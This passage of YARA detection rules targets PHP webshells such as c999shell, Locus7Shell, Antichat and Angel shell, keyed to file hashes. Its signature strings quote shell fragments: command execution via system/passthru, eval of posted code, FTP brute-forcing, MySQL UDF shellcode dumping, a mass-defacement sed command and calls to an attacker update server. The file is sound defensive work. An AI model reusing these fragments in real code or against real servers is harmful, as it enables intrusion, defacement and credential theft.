      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 01f78be6f7cad02658508fe4616098a9.php, 05311655a15b75fab86956663e1819cd.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15e786a334203308d12856d155bbdb8088ed8afc.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 27.9.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php, 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash4 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash5 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash6 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash8 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash9 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash10 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash11 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
      hash12 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
      hash13 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash14 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash15 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash16 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $x1 = "displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $x2 = "else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}" fullword ascii
      $s3 = "if (file_get_contents($v)) {echo \"<b><font color=red>You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s4 = "displaysecinfo(\"Is GET installed?\",myshellexec(\"which GET\"));" fullword ascii
      $s5 = "if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace(\"&nbsp;|<br>\",\" \",$donated_html));}" fullword ascii
      $s6 = "elseif (trim($cmd) == \"tasklist\") {$act = \"processes\";}" fullword ascii
      $s7 = "else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = TRUE;}}" fullword ascii
      $s8 = "if (!headers_sent() and $gzipencode and !in_array($ft,array(\"img\",\"download\",\"notepad\")))" fullword ascii
      $s9 = "if (($_SERVER[\"PHP_AUTH_USER\"] != $login) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $md5_pass))" fullword ascii
      $s10 = "displaysecinfo(\"Distrib name\",myshellexec(\"cat /etc/issue.net\"));" fullword ascii
      $s11 = "displaysecinfo(\"OS Version?\",myshellexec(\"cat /proc/version\"));" fullword ascii
      $s12 = "displaysecinfo(\"HDD space\",myshellexec(\"df -h\"));" fullword ascii
      $s13 = "displaysecinfo(\"locate proftpd.conf\",myshellexec(\"locate proftpd.conf\"));" fullword ascii
      $s14 = "displaysecinfo(\"Distrib name (2)\",myshellexec(\"cat /etc/*-realise\"));" fullword ascii
      $s15 = "document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;" fullword ascii
      $s16 = "displaysecinfo(\"Where is apache\",myshellexec(\"whereis apache\"));" fullword ascii
      $s17 = "displaysecinfo(\"Mount options \",myshellexec(\"cat /etc/fstab\"));" fullword ascii
      $s18 = "displaysecinfo(\"Is links installed?\",myshellexec(\"which links\"));" fullword ascii
      $s19 = "displaysecinfo(\"Is fetch installed?\",myshellexec(\"which fetch\"));" fullword ascii
      $s20 = "displaysecinfo(\"Is perl installed?\",myshellexec(\"which perl\"));" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c or uint16(0) == 0x2a2f or uint16(0) == 0x6544 ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_0ad17701cf5e5a59aa57f35aa240d9e40d28ba50_626c5c9305cee457e10b85c81af262c5bc437255_6612561e_151
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash3 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash4 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
   strings:
      $x1 = "function c999ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x2 = "$logfile = $tmpdir_logs.\"c999sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x3 = "$fqb_log = \"FTP Quick Brute (called c999shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s4 = "header(\"WWW-Authenticate: Basic realm=\\\"c999shell \".$shver.\": \".$login_txt.\"\\\"\");" fullword ascii
      $s5 = "if ($fqb_logemail) {@mail($fqb_logemail,\"c999shell v. \".$shver.\" report\",$fqb_log);}" fullword ascii
      $s6 = ".$k.\"][0] - unknown command.\"; c999shexit();}" fullword ascii
      $s7 = "$bindport_pass = \"c999\";  // default password for binding" fullword ascii
      $s8 = "if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo \"Warning! Configuration error in \\$regxp_highlight[\".$k" ascii
      $s9 = "if ($actemptybuff) {$sess_data[\"copy\"] = $sess_data[\"cut\"] = array(); c999_sess_put($sess_data);}" fullword ascii
      $s10 = "if (c999ftpbrutecheck(\"localhost\",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))" fullword ascii
      $s11 = "\"c999sh_datapipe.pl\" => \"c999sh_datapipe_pl.txt\"," fullword ascii
      $s12 = "\"c999sh_bindport.pl\" => \"c999sh_bindport_pl.txt\"," fullword ascii
      $s13 = "mail($suppmail,\"c999shell v.\".$shver.\" feedback #\".$ticket,$body,\"FROM: \".$suppmail);" fullword ascii
      $s14 = "\"c999sh_bindport.c\" => \"c999sh_bindport_c.txt\"," fullword ascii
      $s15 = "\"c999sh_datapipe.c\" => \"c999sh_datapipe_c.txt\"," fullword ascii
      $s16 = "k_email).\"\\nMessage:\\n\".htmlspecialchars($fdbk_body).\"\\n\\nIP: \".$REMOTE_ADDR;" fullword ascii
      $s17 = "if ($name) {return file_get_contents($c999sh_sourcesurl.$name);}" fullword ascii
      $s18 = "if (unlink(__FILE__)) {@ob_clean(); echo \"Thanks for using c999shell v.\".$shver.\"!\"; c999shexit(); }" fullword ascii
      $s19 = "$body = \"c999shell v.\".$shver.\" feedback #\".$ticket.\"\\nName: \".htmlspecialchars($fdbk_name).\"\\nE-mail: \".htmlspecialch" ascii
      $s20 = "if ($selfwrite or $updatenow) {@ob_clean(); c999sh_getupdate($selfwrite,1); exit;}" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _35aa7dca621fb62d8241030b4e03d301ae55fb61_4475d48b0a2931bf2ef9590ce74953bb9abcc535_a5ba719d22ba09dd6581a8e81170f0cda778a3a9_152
{
   meta:
      description = "php17 - from files 35aa7dca621fb62d8241030b4e03d301ae55fb61.php, 4475d48b0a2931bf2ef9590ce74953bb9abcc535.php, a5ba719d22ba09dd6581a8e81170f0cda778a3a9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "05a9f8fa49f3244384e5647f76665e77dee63f9a81bf071f9ee2139278c18390"
      hash2 = "49daa239b4cde3834e3e8fa507589a64f8899e98e5a2eaa129febe3f789250e1"
      hash3 = "593c6d00212d6044dbc29036c6e59e8875b1280c63745a06580de3cc42e9e16c"
   strings:
      $x1 = "$query=\"INSERT into Temp_udf values (CONVERT($shellcode,CHAR));\";" fullword ascii
      $s2 = "$s=\"SELECT unhex(cmd) FROM diy_dll INTO DUMPFILE '$diypath'\";" fullword ascii
      $s3 = "$query=\"SELECT udf FROM Temp_udf INTO DUMPFILE '\".$path.\"';\" ;" fullword ascii
      $s4 = "$s=\"insert into diy_dll (cmd) values (hex(load_file('$diy')))\";" fullword ascii
      $s5 = "echo '<form action=\"?action=dll\" method=\"post\"/>';" fullword ascii
      $s6 = "header(\"Location:\".$_SERVER[\"SCRIPT_NAME\"]);" fullword ascii
      $s7 = "$s='create table diy_dll (cmd LONGBLOB)';" fullword ascii
      $s8 = "if($_GET['action']=='logout'){" fullword ascii
      $s9 = "setcookie(\"connect[name]\",$_POST['name']);" fullword ascii
      $s10 = "mysql_query('DROP TABLE Temp_udf');" fullword ascii
      $s11 = "$query=mysql_query('CREATE TABLE Temp_udf(udf BLOB);');" fullword ascii
      $s12 = ".\".mysql_error().\"<a href='javascript:history.back()'>" fullword ascii
      $s13 = "if(!move_uploaded_file($_FILES['file']['tmp_name'],$upfile)){" fullword ascii
      $s14 = "echo '<form name=\"form2\" method=\"post\" action=\"\">';" fullword ascii
      $s15 = "$_POST = array_map('stripslashes_deep', $_POST); " fullword ascii
      $s16 = "setcookie(\"connect[$key]\",\"\",time()-1);" fullword ascii
      $s17 = "$diypath=str_replace('\\\\','/',$_POST['diypath']);" fullword ascii
      $s18 = "mysql_query('DROP TABLE diy_dll');" fullword ascii
      $s19 = "foreach($_COOKIE[\"connect\"] as $key=>$value){" fullword ascii
      $s20 = "if(is_uploaded_file($_FILES['file']['tmp_name']))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1f1a80153e0fc2ec0b688b66949afb49f1897914_8c5b26f383a4b176a12657b913f35d2a639ea054_Antichat_Shell_Modified_by_Go0o_antichat__153
{
   meta:
      description = "php17 - from files 1f1a80153e0fc2ec0b688b66949afb49f1897914.php, 8c5b26f383a4b176a12657b913f35d2a639ea054.php, Antichat-Shell-Modified-by-Go0o.php, antichat.php, Antichat_Shell._Modified_by_Go0o.php, Antichat_Shell_Modified_by_Go0o.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da39f93031e1ca0bd919e5a062b01d0bf39b52e88919ebae40a1379523ccab37"
      hash2 = "f633b6f8fbec621cd8ce60cd786926d3f4a552cc75375ec875ee8e9e4735ba4b"
      hash3 = "176def90c34fe4bb92b70f326e41fea5b020de5ab9ddba7e7137f49668353955"
      hash4 = "6d7af399cf9d9ef4f90454a35ad31bc41884035c8c7a5d12ff924007a698a039"
      hash5 = "4bbf0521ec9f2c1ebcfba9da1f0008df21b7199327ea9b475c3fdd707d918b23"
      hash6 = "cdd96e4dcce2cd8c3156108eec776d5c40879fb01b0ea80dfa190e8f3e51cb05"
   strings:
      $s1 = "$serv = @mysql_connect(\"$adress:$port\", \"$login\", \"$pass\") or die(\"" fullword ascii
      $s2 = ": $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s3 = "<input type=hidden name=cmd size=85 value=mysql_dump>" fullword ascii
      $s4 = ": &nbsp;&nbsp;<input name=login value='$login' size=20>" fullword ascii
      $s5 = "<input type=hidden name=login value=$login>" fullword ascii
      $s6 = "<input name=login value='$login' type=hidden>" fullword ascii
      $s7 = ":</td><td>&nbsp;&nbsp;$dat2 - $date2</td></tr>" fullword ascii
      $s8 = ":</td><td>&nbsp;&nbsp;$dat - $date</td></tr>" fullword ascii
      $s9 = ": <input type=checkbox name=dif value=1 id=dif><input type=text name=dif_name size=80 value=\";" fullword ascii
      $s10 = ": &nbsp;&nbsp;&nbsp;&nbsp;<input name=port value='$port' size=20>" fullword ascii
      $s11 = ":\\t$dat2 - $date2\");" fullword ascii
      $s12 = "echo \"<STYLE>BODY{background-color: #2b2f34;color: #9acd32;</STYLE><table><tr><td>" fullword ascii
      $s13 = "<tr><td>&nbsp;<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''>" fullword ascii
      $s14 = ": <input name=pass value='$pass' size=20>" fullword ascii
      $s15 = ": &nbsp;&nbsp;&nbsp;&nbsp;<input name=adress value='$adress' size=20>" fullword ascii
      $s16 = ":</b></td><td><font color=red>&nbsp;&nbsp;$word</font></td></tr>" fullword ascii
      $s17 = "<input type=hidden name=pass value=$pass>" fullword ascii
      $s18 = "<input name=port value='$port' type=hidden>" fullword ascii
      $s19 = "<input name=pass value='$pass' type=hidden>" fullword ascii
      $s20 = "</td><td><input type='submit' value='Decrypt MD5' class=button1></td></tr></form>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _0303e32c8e6674ec89356c9282eeac81606b4fb5_043c3d7e489c69b48737cc0c92d0f3a2_04edbee5e0a3cee384e464d05969bd89b0d32a52_0e634bcc_154
{
   meta:
      description = "php17 - from files 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 043c3d7e489c69b48737cc0c92d0f3a2.php, 04edbee5e0a3cee384e464d05969bd89b0d32a52.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2009mssql.php, 2011.php, 2011__2_.php, 2013.php, 49c50fe8a010c9849384328b5ca7738065be0a13.php, 5b9824d1b6de1963106fcabcbd08b1f87a29de30.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, 7a46a87a95f54ab5afc04ff43e14a060d7062f26.php, 82e9a1a1accef35ca21d1e7da20c851659596462.php, 8cb920e907d03c01ede32ca82469f2ec6b551746.php, a647275c30e0a1e78903680ea97931aa8cd39118.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angel2.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash2 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash5 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash6 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash7 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash8 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash9 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
      hash10 = "4cb2f9e72641a594228669c0e2eb2188cc32fb13ae6708f3d2d39c620a76c8a9"
      hash11 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
      hash12 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash13 = "a198556031139dcbe1c02e2e6e668f4388f4b1277c90fcf425e6834b934df75e"
      hash14 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
      hash15 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash16 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
      hash17 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash18 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash19 = "3ceb493e17daaaa547f05cf557885715fb575e684512dfc6b679c91285835995"
      hash20 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash21 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $s1 = "if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}" fullword ascii
      $s2 = "if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}" fullword ascii
      $s3 = "if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}" fullword ascii
      $s4 = "function execute($cfe) {" fullword ascii
      $s5 = "echo 'Processed in '.$totaltime.' second(s)';" fullword ascii
      $s6 = "$content = str_replace(\"\\t\", \"&nbsp;&nbsp;&nbsp;&nbsp;\", $content);" fullword ascii
      $s7 = "orld['write'].$world['execute'];" fullword ascii
      $s8 = "$content = str_replace(\"  \", \"&nbsp;&nbsp;\", $content);" fullword ascii
      $s9 = "$content = str_replace(\"\\n\", \"<br />\", $content);" fullword ascii
      $s10 = "p(\"<input id=\\\"$name\\\" type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\" />\");" fullword ascii
      $s11 = "return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$w" ascii
      $s12 = "return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$w" ascii
      $s13 = "p(\"<option value=\\\"$key\\\" selected>$value</option>\");" fullword ascii
      $s14 = "function formhead($arg = array()) {" fullword ascii
      $s15 = "$result = get_cfg_var($varname);" fullword ascii
      $s16 = "p(\"<option value=\\\"$key\\\">$value</option>\");" fullword ascii
      $s17 = "p('<table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\">');" fullword ascii
      $s18 = "p(\"$arg[title] <select class=\\\"input\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name]\\\" $onchange>\");" fullword ascii
      $s19 = "function html_clean($content) {" fullword ascii
      $s20 = "function getcfg($varname) {" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_626c5c9305cee457e10b85c81af262c5bc437255_6612561e19ec45c494d5154c3b502a2e72817735_155
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash3 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
   strings:
      $x1 = "RKS.COM/\\\">x2300 Shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x3 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x4 = "iv=\\'refresh\\' content=\\'5\\\\;url=http\\:\\/\\/ALTURKS.COM\\'>/g' index.*\">index.* Mass Defacement" fullword ascii
      $x5 = "$accessdeniedmess = \"<a href=\\\"http://ALTURKS.COM\\\">x2300 Locus7Shell v.\".$shver.\"</a>: access denied\";" fullword ascii
      $x6 = "<OPTION VALUE=\"sed -i -e 's/<html>/<div style=\\'position\\:absolute\\;width\\:2000px\\;height\\:2000px\\;background-color\\:bl" ascii
      $s7 = "$c999sh_updateurl = \"http://ALTURKS.COM/files/lshell_update/\"; //Update server" fullword ascii
      $s8 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" b" ascii
      $s9 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - Locus7Shell - Edited By KingDefacer</title><STYLE>TD { FONT-SIZE: 8p" ascii
      $s10 = "# Home page: http://www.ALTURKS.COM" fullword ascii
      $s11 = "$donated_html = \"<center><b>x2300 Locus7Shell - Edited By KingDefacer</b></center>\";" fullword ascii
      $s12 = "*  Written by md5cracking.com                                                          " fullword ascii
      $s13 = "</th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align=\"left\"><b>una" ascii
      $s14 = "*  C100 SHELL - REVAMPED (X2300) MODIFIED BY KINGDEFACER    " fullword ascii
      $s15 = "*  UNDERGROUND NETWORK | WWW.ALTURKS.COM                 " fullword ascii
      $s16 = "$c999sh_sourcesurl = \"http://ALTURKS.COM/\"; //Sources-server" fullword ascii
      $s17 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s18 = "exec(\"id\"),90,\"<br>\",1);} else {echo get_current_user();} ?></b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<?php echo $h" ascii
      $s19 = "w.ALTURKS.COM</font></a><font color=\"#FF0000\"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--<" ascii
      $s20 = "\\;&nbsp\\;<font size=\\'10\\' color=\\'green\\'>HACKED BY <a href=\\'http\\:\\/\\/ALTURKS.COM\\'>LOCUS7S<\\/a><\\/font><\\/div>" ascii
   condition:
      ( ( uint16(0) == 0x733c or uint16(0) == 0x3f3c ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _3d2c16ba66c49d6776818b38d56795304adf6f8c_41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289_9da47055cc121171c1d820bc9185e69f0d9de1f3__156
{
   meta:
      description = "php17 - from files 3d2c16ba66c49d6776818b38d56795304adf6f8c.php, 41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289.php, 9da47055cc121171c1d820bc9185e69f0d9de1f3.php, Antichat_Shell._Modified_by_Go0o.php, Antichat_Shell_Modified_by_Go0o.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bc4da237fd7e9d00ea56ae4842fc9f4a9bc2da44c0bef7c0ccaafc377a60f9ff"
      hash2 = "885838c306798d11ca317627a98d94c7c1c30522a6d5d6a0c897560919ed4ffe"
      hash3 = "6939898da48e7b6607e02143c78d3201ae21230a8e49225d1aaca646a42d6df0"
      hash4 = "4bbf0521ec9f2c1ebcfba9da1f0008df21b7199327ea9b475c3fdd707d918b23"
      hash5 = "cdd96e4dcce2cd8c3156108eec776d5c40879fb01b0ea80dfa190e8f3e51cb05"
   strings:
      $x1 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x2 = "elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $s3 = "elseif(@is_resource($f = @popen($cmd,\"r\"))){$ret = \"\";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}" fullword ascii
      $s4 = "if(function_exists('exec')){@exec($cmd,$ret);$ret = join(\"\\n\",$ret);}" fullword ascii
      $s5 = "elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}" fullword ascii
      $s6 = "if(!isset($_POST['filename'])) $uploadfile = $dirupload.basename($_FILES['file']['name']); else " fullword ascii
      $s7 = "if(isset($_POST['phpev']))$content.=eval($_POST['phpev']);}" fullword ascii
      $s8 = "if(isset($_POST['dirupload'])) $dirupload=$_POST['dirupload'];else $dirupload=$dir;" fullword ascii
      $s9 = "(@ini_get('disable_functions')!=\"\" ? $disfunc=ini_get('disable_functions') : $disfunc=0);" fullword ascii
      $s10 = "if(@get_magic_quotes_gpc()){foreach ($_POST as $k=>$v){$_POST[$k] = stripslashes($v);}}" fullword ascii
      $s11 = "if(file_exists($uploadfile))$content.=$lang['filext']; " fullword ascii
      $s12 = "if(isset($action)){if(!in_array($action,$act))$action=\"viewer\";else $action=$action;}else $action=\"viewer\";" fullword ascii
      $s13 = "if(test_dir($dirupload)==1 && test_dir($dir)!=3 && test_dir($dir)!=4){createdir($dirupload);}" fullword ascii
      $s14 = "\">GET</option></select>File addres:<input type=text name=urldown>" fullword ascii
      $s15 = "$content.=$lang['uploadok'];" fullword ascii
      $s16 = "t: 8pt verdana, geneva, lucida, \\'lucida grande\\', arial, helvetica, sans-serif;border-color:black;}</style>';" fullword ascii
      $s17 = "if(@$_POST['create'])writef($file,\"\");" fullword ascii
      $s18 = "$content.='<tr><td><select size=\\\"1\\\" name=\\\"with\\\"><option value=\\\"wget\\\">wget</option><option value=\\\"fetch\\\">" ascii
      $s19 = "$content.='<tr><td><select size=\\\"1\\\" name=\\\"with\\\"><option value=\\\"wget\\\">wget</option><option value=\\\"fetch\\\">" ascii
      $s20 = "if(isset($_POST['uploadloc'])){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 90KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0303e32c8e6674ec89356c9282eeac81606b4fb5_04edbee5e0a3cee384e464d05969bd89b0d32a52_091f4d33fe8f9ccfc76a0976a54396ad_2008_200_157
{
   meta:
      description = "php17 - from files 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 04edbee5e0a3cee384e464d05969bd89b0d32a52.php, 091f4d33fe8f9ccfc76a0976a54396ad.php, 2008.php, 2009mssql.php, 49c50fe8a010c9849384328b5ca7738065be0a13.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php, 82e9a1a1accef35ca21d1e7da20c851659596462.php, 8cb920e907d03c01ede32ca82469f2ec6b551746.php, a647275c30e0a1e78903680ea97931aa8cd39118.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash2 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash3 = "05704ad19226b29711324aaa819d18711c916acb17f9158e3616ad505cb844a6"
      hash4 = "6e0ea4ea135950956996df7e86fed9c7f7d77ff89aa1843ec5290ab38e638da4"
      hash5 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash6 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
      hash7 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
      hash8 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
      hash9 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash10 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
   strings:
      $s1 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');" fullword ascii
      $s2 = ".head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
      $s3 = "p('<td><a href=\"'.$fileurl.'\" target=\"_blank\">'.$filedb['filename'].'</a></td>');" fullword ascii
      $s4 = "setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);" fullword ascii
      $s5 = "p('<a href=\"javascript:opfile(\\'newtime\\',\\''.$filedb['server_link'].'\\',\\''.$filedb['dirlink'].'\\');\">Time</a>');" fullword ascii
      $s6 = "<input type=\"hidden\" name=\"doing\" value=\"login\">" fullword ascii
      $s7 = "echo '<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;\">';" fullword ascii
      $s8 = "<td><span style=\"float:right;\">Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s9 = "p('<meta http-equiv=\"refresh\" content=\"1;URL='.$self.'\">');" fullword ascii
      $s10 = "11 => array('PHPINFO',(IS_PHPINFO ? '<a href=\"javascript:goaction(\\'phpinfo\\');\">Yes</a>' : 'No'))," fullword ascii
